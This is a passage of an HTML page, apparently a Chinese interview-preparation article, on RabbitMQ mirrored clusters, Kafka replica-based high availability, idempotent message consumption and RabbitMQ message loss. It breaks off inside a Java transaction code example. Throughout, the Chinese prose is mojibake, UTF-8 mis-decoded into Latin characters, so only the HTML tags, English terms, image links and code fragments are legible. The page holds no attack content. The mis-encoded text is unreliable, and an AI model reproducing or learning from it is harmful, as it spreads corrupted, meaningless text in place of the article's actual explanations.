çš„æ—¶å€™ï¼Œéƒ½ä¼šè‡ªåŠ¨æŠŠ<strong>æ¶ˆæ¯åŒæ­¥</strong>åˆ°å¤šä¸ªå®ä¾‹çš„ queue ä¸Šã€‚</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-8.png" alt="mq-8"></p><p>é‚£ä¹ˆ<strong>å¦‚ä½•å¼€å¯è¿™ä¸ªé•œåƒé›†ç¾¤æ¨¡å¼</strong>å‘¢ï¼Ÿå…¶å®å¾ˆç®€å•ï¼ŒRabbitMQ æœ‰å¾ˆå¥½çš„ç®¡ç†æ§åˆ¶å°ï¼Œå°±æ˜¯åœ¨åå°æ–°å¢ä¸€ä¸ªç­–ç•¥ï¼Œè¿™ä¸ªç­–ç•¥æ˜¯<strong>é•œåƒé›†ç¾¤æ¨¡å¼çš„ç­–ç•¥</strong>ï¼ŒæŒ‡å®šçš„æ—¶å€™æ˜¯å¯ä»¥è¦æ±‚æ•°æ®åŒæ­¥åˆ°æ‰€æœ‰èŠ‚ç‚¹çš„ï¼Œä¹Ÿå¯ä»¥è¦æ±‚åŒæ­¥åˆ°æŒ‡å®šæ•°é‡çš„èŠ‚ç‚¹ï¼Œå†æ¬¡åˆ›å»º queue çš„æ—¶å€™ï¼Œåº”ç”¨è¿™ä¸ªç­–ç•¥ï¼Œå°±ä¼šè‡ªåŠ¨å°†æ•°æ®åŒæ­¥åˆ°å…¶ä»–çš„èŠ‚ç‚¹ä¸Šå»äº†ã€‚</p><p>è¿™æ ·çš„è¯ï¼Œå¥½å¤„åœ¨äºï¼Œä½ ä»»ä½•ä¸€ä¸ªæœºå™¨å®•æœºäº†ï¼Œæ²¡äº‹å„¿ï¼Œå…¶å®ƒæœºå™¨ï¼ˆèŠ‚ç‚¹ï¼‰è¿˜åŒ…å«äº†è¿™ä¸ª queue çš„å®Œæ•´æ•°æ®ï¼Œåˆ«çš„ consumer éƒ½å¯ä»¥åˆ°å…¶å®ƒèŠ‚ç‚¹ä¸Šå»æ¶ˆè´¹æ•°æ®ã€‚åå¤„åœ¨äºï¼Œç¬¬ä¸€ï¼Œè¿™ä¸ªæ€§èƒ½å¼€é”€ä¹Ÿå¤ªå¤§äº†å§ï¼Œæ¶ˆæ¯éœ€è¦åŒæ­¥åˆ°æ‰€æœ‰æœºå™¨ä¸Šï¼Œå¯¼è‡´ç½‘ç»œå¸¦å®½å‹åŠ›å’Œæ¶ˆè€—å¾ˆé‡ï¼ç¬¬äºŒï¼Œè¿™ä¹ˆç©å„¿ï¼Œä¸æ˜¯åˆ†å¸ƒå¼çš„ï¼Œå°±<strong>æ²¡æœ‰æ‰©å±•æ€§å¯è¨€</strong>äº†ï¼Œå¦‚æœæŸä¸ª queue è´Ÿè½½å¾ˆé‡ï¼Œä½ åŠ æœºå™¨ï¼Œæ–°å¢çš„æœºå™¨ä¹ŸåŒ…å«äº†è¿™ä¸ª queue çš„æ‰€æœ‰æ•°æ®ï¼Œå¹¶<strong>æ²¡æœ‰åŠæ³•çº¿æ€§æ‰©å±•</strong>ä½ çš„ queueã€‚ä½ æƒ³ï¼Œå¦‚æœè¿™ä¸ª queue çš„æ•°æ®é‡å¾ˆå¤§ï¼Œå¤§åˆ°è¿™ä¸ªæœºå™¨ä¸Šçš„å®¹é‡æ— æ³•å®¹çº³äº†ï¼Œæ­¤æ—¶è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><h3><span id="kafka-çš„é«˜å¯ç”¨æ€§">Kafka çš„é«˜å¯ç”¨æ€§</span></h3><p>Kafka ä¸€ä¸ªæœ€åŸºæœ¬çš„æ¶æ„è®¤è¯†ï¼šç”±å¤šä¸ª broker ç»„æˆï¼Œæ¯ä¸ª broker æ˜¯ä¸€ä¸ªèŠ‚ç‚¹ï¼›ä½ åˆ›å»ºä¸€ä¸ª topicï¼Œè¿™ä¸ª topic å¯ä»¥åˆ’åˆ†ä¸ºå¤šä¸ª partitionï¼Œæ¯ä¸ª partition å¯ä»¥å­˜åœ¨äºä¸åŒçš„ broker ä¸Šï¼Œæ¯ä¸ª partition å°±æ”¾ä¸€éƒ¨åˆ†æ•°æ®ã€‚</p><p>è¿™å°±æ˜¯<strong>å¤©ç„¶çš„åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—</strong>ï¼Œå°±æ˜¯è¯´ä¸€ä¸ª topic çš„æ•°æ®ï¼Œæ˜¯<strong>åˆ†æ•£æ”¾åœ¨å¤šä¸ªæœºå™¨ä¸Šçš„ï¼Œæ¯ä¸ªæœºå™¨å°±æ”¾ä¸€éƒ¨åˆ†æ•°æ®</strong>ã€‚</p><p>å®é™…ä¸Š RabbitMQ ä¹‹ç±»çš„ï¼Œå¹¶ä¸æ˜¯åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå®ƒå°±æ˜¯ä¼ ç»Ÿçš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œåªä¸è¿‡æä¾›äº†ä¸€äº›é›†ç¾¤ã€HA(High Availability, é«˜å¯ç”¨æ€§) çš„æœºåˆ¶è€Œå·²ï¼Œå› ä¸ºæ— è®ºæ€ä¹ˆç©å„¿ï¼ŒRabbitMQ ä¸€ä¸ª queue çš„æ•°æ®éƒ½æ˜¯æ”¾åœ¨ä¸€ä¸ªèŠ‚ç‚¹é‡Œçš„ï¼Œé•œåƒé›†ç¾¤ä¸‹ï¼Œä¹Ÿæ˜¯æ¯ä¸ªèŠ‚ç‚¹éƒ½æ”¾è¿™ä¸ª queue çš„å®Œæ•´æ•°æ®ã€‚</p><p>Kafka 0.8 ä»¥å‰ï¼Œæ˜¯æ²¡æœ‰ HA æœºåˆ¶çš„ï¼Œå°±æ˜¯ä»»ä½•ä¸€ä¸ª broker å®•æœºäº†ï¼Œé‚£ä¸ª broker ä¸Šçš„ partition å°±åºŸäº†ï¼Œæ²¡æ³•å†™ä¹Ÿæ²¡æ³•è¯»ï¼Œæ²¡æœ‰ä»€ä¹ˆé«˜å¯ç”¨æ€§å¯è¨€ã€‚</p><p>æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬å‡è®¾åˆ›å»ºäº†ä¸€ä¸ª topicï¼ŒæŒ‡å®šå…¶ partition æ•°é‡æ˜¯ 3 ä¸ªï¼Œåˆ†åˆ«åœ¨ä¸‰å°æœºå™¨ä¸Šã€‚ä½†æ˜¯ï¼Œå¦‚æœç¬¬äºŒå°æœºå™¨å®•æœºäº†ï¼Œä¼šå¯¼è‡´è¿™ä¸ª topic çš„ 1&#x2F;3 çš„æ•°æ®å°±ä¸¢äº†ï¼Œå› æ­¤è¿™ä¸ªæ˜¯åšä¸åˆ°é«˜å¯ç”¨çš„ã€‚</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/kafka-before.png" alt="kafka-before"></p><p>Kafka 0.8 ä»¥åï¼Œæä¾›äº† HA æœºåˆ¶ï¼Œå°±æ˜¯ replicaï¼ˆå¤åˆ¶å“ï¼‰ å‰¯æœ¬æœºåˆ¶ã€‚æ¯ä¸ª partition çš„æ•°æ®éƒ½ä¼šåŒæ­¥åˆ°å…¶å®ƒæœºå™¨ä¸Šï¼Œå½¢æˆè‡ªå·±çš„å¤šä¸ª replica å‰¯æœ¬ã€‚æ‰€æœ‰ replica ä¼šé€‰ä¸¾ä¸€ä¸ª leader å‡ºæ¥ï¼Œé‚£ä¹ˆç”Ÿäº§å’Œæ¶ˆè´¹éƒ½è·Ÿè¿™ä¸ª leader æ‰“äº¤é“ï¼Œç„¶åå…¶ä»– replica å°±æ˜¯ followerã€‚å†™çš„æ—¶å€™ï¼Œleader ä¼šè´Ÿè´£æŠŠæ•°æ®åŒæ­¥åˆ°æ‰€æœ‰ follower ä¸Šå»ï¼Œè¯»çš„æ—¶å€™å°±ç›´æ¥è¯» leader ä¸Šçš„æ•°æ®å³å¯ã€‚åªèƒ½è¯»å†™ leaderï¼Ÿå¾ˆç®€å•ï¼Œ<strong>è¦æ˜¯ä½ å¯ä»¥éšæ„è¯»å†™æ¯ä¸ª followerï¼Œé‚£ä¹ˆå°±è¦ care æ•°æ®ä¸€è‡´æ€§çš„é—®é¢˜</strong>ï¼Œç³»ç»Ÿå¤æ‚åº¦å¤ªé«˜ï¼Œå¾ˆå®¹æ˜“å‡ºé—®é¢˜ã€‚Kafka ä¼šå‡åŒ€åœ°å°†ä¸€ä¸ª partition çš„æ‰€æœ‰ replica åˆ†å¸ƒåœ¨ä¸åŒçš„æœºå™¨ä¸Šï¼Œè¿™æ ·æ‰å¯ä»¥æé«˜å®¹é”™æ€§ã€‚</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/kafka-after.png" alt="kafka-after"></p><p>è¿™ä¹ˆæï¼Œå°±æœ‰æ‰€è°“çš„<strong>é«˜å¯ç”¨æ€§</strong>äº†ï¼Œå› ä¸ºå¦‚æœæŸä¸ª broker å®•æœºäº†ï¼Œæ²¡äº‹å„¿ï¼Œé‚£ä¸ª brokerä¸Šé¢çš„ partition åœ¨å…¶ä»–æœºå™¨ä¸Šéƒ½æœ‰å‰¯æœ¬çš„ã€‚å¦‚æœè¿™ä¸ªå®•æœºçš„ broker ä¸Šé¢æœ‰æŸä¸ª partition çš„ leaderï¼Œé‚£ä¹ˆæ­¤æ—¶ä¼šä» follower ä¸­<strong>é‡æ–°é€‰ä¸¾</strong>ä¸€ä¸ªæ–°çš„ leader å‡ºæ¥ï¼Œå¤§å®¶ç»§ç»­è¯»å†™é‚£ä¸ªæ–°çš„ leader å³å¯ã€‚è¿™å°±æœ‰æ‰€è°“çš„é«˜å¯ç”¨æ€§äº†ã€‚</p><p><strong>å†™æ•°æ®</strong>çš„æ—¶å€™ï¼Œç”Ÿäº§è€…å°±å†™ leaderï¼Œç„¶å leader å°†æ•°æ®è½åœ°å†™æœ¬åœ°ç£ç›˜ï¼Œæ¥ç€å…¶ä»– follower è‡ªå·±ä¸»åŠ¨ä» leader æ¥ pull æ•°æ®ã€‚ä¸€æ—¦æ‰€æœ‰ follower åŒæ­¥å¥½æ•°æ®äº†ï¼Œå°±ä¼šå‘é€ ack ç»™ leaderï¼Œleader æ”¶åˆ°æ‰€æœ‰ follower çš„ ack ä¹‹åï¼Œå°±ä¼šè¿”å›å†™æˆåŠŸçš„æ¶ˆæ¯ç»™ç”Ÿäº§è€…ã€‚ï¼ˆå½“ç„¶ï¼Œè¿™åªæ˜¯å…¶ä¸­ä¸€ç§æ¨¡å¼ï¼Œè¿˜å¯ä»¥é€‚å½“è°ƒæ•´è¿™ä¸ªè¡Œä¸ºï¼‰</p><p><strong>æ¶ˆè´¹</strong>çš„æ—¶å€™ï¼Œåªä¼šä» leader å»è¯»ï¼Œä½†æ˜¯åªæœ‰å½“ä¸€ä¸ªæ¶ˆæ¯å·²ç»è¢«æ‰€æœ‰ follower éƒ½åŒæ­¥æˆåŠŸè¿”å› ack çš„æ—¶å€™ï¼Œè¿™ä¸ªæ¶ˆæ¯æ‰ä¼šè¢«æ¶ˆè´¹è€…è¯»åˆ°ã€‚</p><p>çœ‹åˆ°è¿™é‡Œï¼Œç›¸ä¿¡ä½ å¤§è‡´æ˜ç™½äº† Kafka æ˜¯å¦‚ä½•ä¿è¯é«˜å¯ç”¨æœºåˆ¶çš„äº†ï¼Œå¯¹å§ï¼Ÿä¸è‡³äºä¸€æ— æ‰€çŸ¥ï¼Œç°åœºè¿˜èƒ½ç»™é¢è¯•å®˜ç”»ç”»å›¾ã€‚è¦æ˜¯é‡ä¸Šé¢è¯•å®˜ç¡®å®æ˜¯ Kafka é«˜æ‰‹ï¼Œæ·±æŒ–äº†é—®ï¼Œé‚£ä½ åªèƒ½è¯´ä¸å¥½æ„æ€ï¼Œå¤ªæ·±å…¥çš„ä½ æ²¡ç ”ç©¶è¿‡ã€‚</p><h1><span id="å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸è¢«é‡å¤æ¶ˆè´¹æˆ–è€…è¯´å¦‚ä½•ä¿è¯æ¶ˆæ¯æ¶ˆè´¹çš„å¹‚ç­‰æ€§">å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸è¢«é‡å¤æ¶ˆè´¹ï¼Ÿæˆ–è€…è¯´ï¼Œå¦‚ä½•ä¿è¯æ¶ˆæ¯æ¶ˆè´¹çš„å¹‚ç­‰æ€§ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>å…¶å®è¿™æ˜¯å¾ˆå¸¸è§çš„ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¿©é—®é¢˜åŸºæœ¬å¯ä»¥è¿èµ·æ¥é—®ã€‚æ—¢ç„¶æ˜¯æ¶ˆè´¹æ¶ˆæ¯ï¼Œé‚£è‚¯å®šè¦è€ƒè™‘ä¼šä¸ä¼šé‡å¤æ¶ˆè´¹ï¼Ÿèƒ½ä¸èƒ½é¿å…é‡å¤æ¶ˆè´¹ï¼Ÿæˆ–è€…é‡å¤æ¶ˆè´¹äº†ä¹Ÿåˆ«é€ æˆç³»ç»Ÿå¼‚å¸¸å¯ä»¥å—ï¼Ÿè¿™ä¸ªæ˜¯ MQ é¢†åŸŸçš„åŸºæœ¬é—®é¢˜ï¼Œå…¶å®æœ¬è´¨ä¸Šè¿˜æ˜¯é—®ä½ <strong>ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—å¦‚ä½•ä¿è¯å¹‚ç­‰æ€§</strong>ï¼Œè¿™ä¸ªæ˜¯ä½ æ¶æ„é‡Œè¦è€ƒè™‘çš„ä¸€ä¸ªé—®é¢˜ã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œé¦–å…ˆä½ åˆ«å¬åˆ°é‡å¤æ¶ˆæ¯è¿™ä¸ªäº‹å„¿ï¼Œå°±ä¸€æ— æ‰€çŸ¥å§ï¼Œä½ <strong>å…ˆå¤§æ¦‚è¯´ä¸€è¯´å¯èƒ½ä¼šæœ‰å“ªäº›é‡å¤æ¶ˆè´¹çš„é—®é¢˜</strong>ã€‚</p><p>é¦–å…ˆï¼Œæ¯”å¦‚ RabbitMQã€RocketMQã€Kafkaï¼Œéƒ½æœ‰å¯èƒ½ä¼šå‡ºç°æ¶ˆæ¯é‡å¤æ¶ˆè´¹çš„é—®é¢˜ï¼Œæ­£å¸¸ã€‚å› ä¸ºè¿™é—®é¢˜é€šå¸¸ä¸æ˜¯ MQ è‡ªå·±ä¿è¯çš„ï¼Œæ˜¯ç”±æˆ‘ä»¬å¼€å‘æ¥ä¿è¯çš„ã€‚æŒ‘ä¸€ä¸ª Kafka æ¥ä¸¾ä¸ªä¾‹å­ï¼Œè¯´è¯´æ€ä¹ˆé‡å¤æ¶ˆè´¹å§ã€‚</p><p>Kafka å®é™…ä¸Šæœ‰ä¸ª offset çš„æ¦‚å¿µï¼Œå°±æ˜¯æ¯ä¸ªæ¶ˆæ¯å†™è¿›å»ï¼Œéƒ½æœ‰ä¸€ä¸ª offsetï¼Œä»£è¡¨æ¶ˆæ¯çš„åºå·ï¼Œç„¶å consumer æ¶ˆè´¹äº†æ•°æ®ä¹‹åï¼Œ<strong>æ¯éš”ä¸€æ®µæ—¶é—´</strong>ï¼ˆå®šæ—¶å®šæœŸï¼‰ï¼Œä¼šæŠŠè‡ªå·±æ¶ˆè´¹è¿‡çš„æ¶ˆæ¯çš„ offset æäº¤ä¸€ä¸‹ï¼Œè¡¨ç¤ºâ€œæˆ‘å·²ç»æ¶ˆè´¹è¿‡äº†ï¼Œä¸‹æ¬¡æˆ‘è¦æ˜¯é‡å¯å•¥çš„ï¼Œä½ å°±è®©æˆ‘ç»§ç»­ä»ä¸Šæ¬¡æ¶ˆè´¹åˆ°çš„ offset æ¥ç»§ç»­æ¶ˆè´¹å§â€ã€‚</p><p>ä½†æ˜¯å‡¡äº‹æ€»æœ‰æ„å¤–ï¼Œæ¯”å¦‚æˆ‘ä»¬ä¹‹å‰ç”Ÿäº§ç»å¸¸é‡åˆ°çš„ï¼Œå°±æ˜¯ä½ æœ‰æ—¶å€™é‡å¯ç³»ç»Ÿï¼Œçœ‹ä½ æ€ä¹ˆé‡å¯äº†ï¼Œå¦‚æœç¢°åˆ°ç‚¹ç€æ€¥çš„ï¼Œç›´æ¥ kill è¿›ç¨‹äº†ï¼Œå†é‡å¯ã€‚è¿™ä¼šå¯¼è‡´ consumer æœ‰äº›æ¶ˆæ¯å¤„ç†äº†ï¼Œä½†æ˜¯æ²¡æ¥å¾—åŠæäº¤ offsetï¼Œå°´å°¬äº†ã€‚é‡å¯ä¹‹åï¼Œå°‘æ•°æ¶ˆæ¯ä¼šå†æ¬¡æ¶ˆè´¹ä¸€æ¬¡ã€‚</p><p>ä¸¾ä¸ªæ —å­ã€‚</p><p>æœ‰è¿™ä¹ˆä¸ªåœºæ™¯ã€‚æ•°æ® 1&#x2F;2&#x2F;3 ä¾æ¬¡è¿›å…¥ kafkaï¼Œkafka ä¼šç»™è¿™ä¸‰æ¡æ•°æ®æ¯æ¡åˆ†é…ä¸€ä¸ª offsetï¼Œä»£è¡¨è¿™æ¡æ•°æ®çš„åºå·ï¼Œæˆ‘ä»¬å°±å‡è®¾åˆ†é…çš„ offset ä¾æ¬¡æ˜¯ 152&#x2F;153&#x2F;154ã€‚æ¶ˆè´¹è€…ä» kafka å»æ¶ˆè´¹çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯æŒ‰ç…§è¿™ä¸ªé¡ºåºå»æ¶ˆè´¹ã€‚å‡å¦‚å½“æ¶ˆè´¹è€…æ¶ˆè´¹äº† <code>offset=153</code> çš„è¿™æ¡æ•°æ®ï¼Œåˆšå‡†å¤‡å»æäº¤ offset åˆ° zookeeperï¼Œæ­¤æ—¶æ¶ˆè´¹è€…è¿›ç¨‹è¢«é‡å¯äº†ã€‚é‚£ä¹ˆæ­¤æ—¶æ¶ˆè´¹è¿‡çš„æ•°æ® 1&#x2F;2 çš„ offset å¹¶æ²¡æœ‰æäº¤ï¼Œkafka ä¹Ÿå°±ä¸çŸ¥é“ä½ å·²ç»æ¶ˆè´¹äº† <code>offset=153</code> è¿™æ¡æ•°æ®ã€‚é‚£ä¹ˆé‡å¯ä¹‹åï¼Œæ¶ˆè´¹è€…ä¼šæ‰¾ kafka è¯´ï¼Œå˜¿ï¼Œå“¥å„¿ä»¬ï¼Œä½ ç»™æˆ‘æ¥ç€æŠŠä¸Šæ¬¡æˆ‘æ¶ˆè´¹åˆ°çš„é‚£ä¸ªåœ°æ–¹åé¢çš„æ•°æ®ç»§ç»­ç»™æˆ‘ä¼ é€’è¿‡æ¥ã€‚ç”±äºä¹‹å‰çš„ offset æ²¡æœ‰æäº¤æˆåŠŸï¼Œé‚£ä¹ˆæ•°æ® 1&#x2F;2 ä¼šå†æ¬¡ä¼ è¿‡æ¥ï¼Œå¦‚æœæ­¤æ—¶æ¶ˆè´¹è€…æ²¡æœ‰å»é‡çš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´é‡å¤æ¶ˆè´¹ã€‚</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-10.png" alt="mq-10"></p><p>å¦‚æœæ¶ˆè´¹è€…å¹²çš„äº‹å„¿æ˜¯æ‹¿ä¸€æ¡æ•°æ®å°±å¾€æ•°æ®åº“é‡Œå†™ä¸€æ¡ï¼Œä¼šå¯¼è‡´è¯´ï¼Œä½ å¯èƒ½å°±æŠŠæ•°æ® 1&#x2F;2 åœ¨æ•°æ®åº“é‡Œæ’å…¥äº† 2 æ¬¡ï¼Œé‚£ä¹ˆæ•°æ®å°±é”™å•¦ã€‚</p><p>å…¶å®é‡å¤æ¶ˆè´¹ä¸å¯æ€•ï¼Œå¯æ€•çš„æ˜¯ä½ æ²¡è€ƒè™‘åˆ°é‡å¤æ¶ˆè´¹ä¹‹åï¼Œ<strong>æ€ä¹ˆä¿è¯å¹‚ç­‰æ€§</strong>ã€‚</p><p>ä¸¾ä¸ªä¾‹å­å§ã€‚å‡è®¾ä½ æœ‰ä¸ªç³»ç»Ÿï¼Œæ¶ˆè´¹ä¸€æ¡æ¶ˆæ¯å°±å¾€æ•°æ®åº“é‡Œæ’å…¥ä¸€æ¡æ•°æ®ï¼Œè¦æ˜¯ä½ ä¸€ä¸ªæ¶ˆæ¯é‡å¤ä¸¤æ¬¡ï¼Œä½ ä¸å°±æ’å…¥äº†ä¸¤æ¡ï¼Œè¿™æ•°æ®ä¸å°±é”™äº†ï¼Ÿä½†æ˜¯ä½ è¦æ˜¯æ¶ˆè´¹åˆ°ç¬¬äºŒæ¬¡çš„æ—¶å€™ï¼Œè‡ªå·±åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦å·²ç»æ¶ˆè´¹è¿‡äº†ï¼Œè‹¥æ˜¯å°±ç›´æ¥æ‰”äº†ï¼Œè¿™æ ·ä¸å°±ä¿ç•™äº†ä¸€æ¡æ•°æ®ï¼Œä»è€Œä¿è¯äº†æ•°æ®çš„æ­£ç¡®æ€§ã€‚</p><p>ä¸€æ¡æ•°æ®é‡å¤å‡ºç°ä¸¤æ¬¡ï¼Œæ•°æ®åº“é‡Œå°±åªæœ‰ä¸€æ¡æ•°æ®ï¼Œè¿™å°±ä¿è¯äº†ç³»ç»Ÿçš„å¹‚ç­‰æ€§ã€‚</p><p>å¹‚ç­‰æ€§ï¼Œé€šä¿—ç‚¹è¯´ï¼Œå°±ä¸€ä¸ªæ•°æ®ï¼Œæˆ–è€…ä¸€ä¸ªè¯·æ±‚ï¼Œç»™ä½ é‡å¤æ¥å¤šæ¬¡ï¼Œä½ å¾—ç¡®ä¿å¯¹åº”çš„æ•°æ®æ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œ<strong>ä¸èƒ½å‡ºé”™</strong>ã€‚</p><p>æ‰€ä»¥ç¬¬äºŒä¸ªé—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆä¿è¯æ¶ˆæ¯é˜Ÿåˆ—æ¶ˆè´¹çš„å¹‚ç­‰æ€§ï¼Ÿ</p><p>å…¶å®è¿˜æ˜¯å¾—ç»“åˆä¸šåŠ¡æ¥æ€è€ƒï¼Œæˆ‘è¿™é‡Œç»™å‡ ä¸ªæ€è·¯ï¼š</p><ul><li>æ¯”å¦‚ä½ æ‹¿ä¸ªæ•°æ®è¦å†™åº“ï¼Œä½ å…ˆæ ¹æ®ä¸»é”®æŸ¥ä¸€ä¸‹ï¼Œå¦‚æœè¿™æ•°æ®éƒ½æœ‰äº†ï¼Œä½ å°±åˆ«æ’å…¥äº†ï¼Œupdate ä¸€ä¸‹å¥½å§ã€‚</li><li>æ¯”å¦‚ä½ æ˜¯å†™ Redisï¼Œé‚£æ²¡é—®é¢˜äº†ï¼Œåæ­£æ¯æ¬¡éƒ½æ˜¯ setï¼Œå¤©ç„¶å¹‚ç­‰æ€§ã€‚</li><li>æ¯”å¦‚ä½ ä¸æ˜¯ä¸Šé¢ä¸¤ä¸ªåœºæ™¯ï¼Œé‚£åšçš„ç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œä½ éœ€è¦è®©ç”Ÿäº§è€…å‘é€æ¯æ¡æ•°æ®çš„æ—¶å€™ï¼Œé‡Œé¢åŠ ä¸€ä¸ªå…¨å±€å”¯ä¸€çš„ idï¼Œç±»ä¼¼è®¢å• id ä¹‹ç±»çš„ä¸œè¥¿ï¼Œç„¶åä½ è¿™é‡Œæ¶ˆè´¹åˆ°äº†ä¹‹åï¼Œå…ˆæ ¹æ®è¿™ä¸ª id å»æ¯”å¦‚ Redis é‡ŒæŸ¥ä¸€ä¸‹ï¼Œä¹‹å‰æ¶ˆè´¹è¿‡å—ï¼Ÿå¦‚æœæ²¡æœ‰æ¶ˆè´¹è¿‡ï¼Œä½ å°±å¤„ç†ï¼Œç„¶åè¿™ä¸ª id å†™ Redisã€‚å¦‚æœæ¶ˆè´¹è¿‡äº†ï¼Œé‚£ä½ å°±åˆ«å¤„ç†äº†ï¼Œä¿è¯åˆ«é‡å¤å¤„ç†ç›¸åŒçš„æ¶ˆæ¯å³å¯ã€‚</li><li>æ¯”å¦‚åŸºäºæ•°æ®åº“çš„å”¯ä¸€é”®æ¥ä¿è¯é‡å¤æ•°æ®ä¸ä¼šé‡å¤æ’å…¥å¤šæ¡ã€‚å› ä¸ºæœ‰å”¯ä¸€é”®çº¦æŸäº†ï¼Œé‡å¤æ•°æ®æ’å…¥åªä¼šæŠ¥é”™ï¼Œä¸ä¼šå¯¼è‡´æ•°æ®åº“ä¸­å‡ºç°è„æ•°æ®ã€‚</li></ul><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-11.png" alt="mq-11"></p><p>å½“ç„¶ï¼Œå¦‚ä½•ä¿è¯ MQ çš„æ¶ˆè´¹æ˜¯å¹‚ç­‰æ€§çš„ï¼Œéœ€è¦ç»“åˆå…·ä½“çš„ä¸šåŠ¡æ¥çœ‹ã€‚</p><h1><span id="å¦‚ä½•ä¿è¯æ¶ˆæ¯çš„å¯é æ€§ä¼ è¾“æˆ–è€…è¯´å¦‚ä½•å¤„ç†æ¶ˆæ¯ä¸¢å¤±çš„é—®é¢˜">å¦‚ä½•ä¿è¯æ¶ˆæ¯çš„å¯é æ€§ä¼ è¾“ï¼Ÿæˆ–è€…è¯´ï¼Œå¦‚ä½•å¤„ç†æ¶ˆæ¯ä¸¢å¤±çš„é—®é¢˜ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>è¿™ä¸ªæ˜¯è‚¯å®šçš„ï¼Œç”¨ MQ æœ‰ä¸ªåŸºæœ¬åŸåˆ™ï¼Œå°±æ˜¯<strong>æ•°æ®ä¸èƒ½å¤šä¸€æ¡ï¼Œä¹Ÿä¸èƒ½å°‘ä¸€æ¡</strong>ï¼Œä¸èƒ½å¤šï¼Œå°±æ˜¯å‰é¢è¯´çš„é‡å¤æ¶ˆè´¹å’Œå¹‚ç­‰æ€§é—®é¢˜ã€‚ä¸èƒ½å°‘ï¼Œå°±æ˜¯è¯´è¿™æ•°æ®åˆ«æä¸¢äº†ã€‚é‚£è¿™ä¸ªé—®é¢˜ä½ å¿…é¡»å¾—è€ƒè™‘ä¸€ä¸‹ã€‚</p><p>å¦‚æœè¯´ä½ è¿™ä¸ªæ˜¯ç”¨ MQ æ¥ä¼ é€’éå¸¸æ ¸å¿ƒçš„æ¶ˆæ¯ï¼Œæ¯”å¦‚è¯´è®¡è´¹ã€æ‰£è´¹çš„ä¸€äº›æ¶ˆæ¯ï¼Œé‚£å¿…é¡»ç¡®ä¿è¿™ä¸ª MQ ä¼ é€’è¿‡ç¨‹ä¸­<strong>ç»å¯¹ä¸ä¼šæŠŠè®¡è´¹æ¶ˆæ¯ç»™å¼„ä¸¢</strong>ã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><p>æ•°æ®çš„ä¸¢å¤±é—®é¢˜ï¼Œå¯èƒ½å‡ºç°åœ¨ç”Ÿäº§è€…ã€MQã€æ¶ˆè´¹è€…ä¸­ï¼Œå’±ä»¬ä» RabbitMQ å’Œ Kafka åˆ†åˆ«æ¥åˆ†æä¸€ä¸‹å§ã€‚</p><h3><span id="rabbitmq">RabbitMQ</span></h3><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/rabbitmq-message-lose.png" alt="rabbitmq-message-lose"></p><h4><span id="ç”Ÿäº§è€…å¼„ä¸¢äº†æ•°æ®">ç”Ÿäº§è€…å¼„ä¸¢äº†æ•°æ®</span></h4><p>ç”Ÿäº§è€…å°†æ•°æ®å‘é€åˆ° RabbitMQ çš„æ—¶å€™ï¼Œå¯èƒ½æ•°æ®å°±åœ¨åŠè·¯ç»™æä¸¢äº†ï¼Œå› ä¸ºç½‘ç»œé—®é¢˜å•¥çš„ï¼Œéƒ½æœ‰å¯èƒ½ã€‚</p><p>æ­¤æ—¶å¯ä»¥é€‰æ‹©ç”¨ RabbitMQ æä¾›çš„äº‹åŠ¡åŠŸèƒ½ï¼Œå°±æ˜¯ç”Ÿäº§è€…<strong>å‘é€æ•°æ®ä¹‹å‰</strong>å¼€å¯ RabbitMQ äº‹åŠ¡<code>channel.txSelect</code>ï¼Œç„¶åå‘é€æ¶ˆæ¯ï¼Œå¦‚æœæ¶ˆæ¯æ²¡æœ‰æˆåŠŸè¢« RabbitMQ æ¥æ”¶åˆ°ï¼Œé‚£ä¹ˆç”Ÿäº§è€…ä¼šæ”¶åˆ°å¼‚å¸¸æŠ¥é”™ï¼Œæ­¤æ—¶å°±å¯ä»¥å›æ»šäº‹åŠ¡<code>channel.txRollback</code>ï¼Œç„¶åé‡è¯•å‘é€æ¶ˆæ¯ï¼›å¦‚æœæ”¶åˆ°äº†æ¶ˆæ¯ï¼Œé‚£ä¹ˆå¯ä»¥æäº¤äº‹åŠ¡<code>channel.txCommit</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å¼€å¯äº‹åŠ¡</span></span><br><span class="line">channel.txSelect</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span 